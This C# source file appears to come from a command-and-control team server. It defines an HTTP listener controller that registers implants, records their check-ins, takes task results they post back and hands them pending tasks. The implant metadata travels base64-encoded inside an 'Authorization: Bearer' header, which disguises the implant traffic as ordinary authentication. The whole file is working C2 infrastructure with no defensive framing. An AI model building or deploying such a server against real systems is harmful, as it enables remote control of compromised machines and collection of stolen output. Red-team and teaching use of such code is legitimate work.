using System.Text;
using System.Text.Json.Serialization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Controllers;
using Newtonsoft.Json;
using TeamServer.Models.Agents;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]

    public class HttpListenerController : ControllerBase
    {

        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public async Task<IActionResult> HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();


            var agent = _agents.GetAgent(metadata.Id);

            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }


            agent.CheckIn();


            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using(var sr = new StreamReader(HttpContext.Request.Body))
                {
                    json = await sr.ReadToEndAsync();
                }

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResults>>(json);
                agent.AddTaskResults(results);
            }


            var tasks = agent.GetPendingTasks();
            return Ok(tasks);
        }

        private AgentMetada ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            //Authorization: Bearer <base64 content>

            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            return JsonConvert.DeserializeObject<AgentMetada>(json);




        }

    }
}
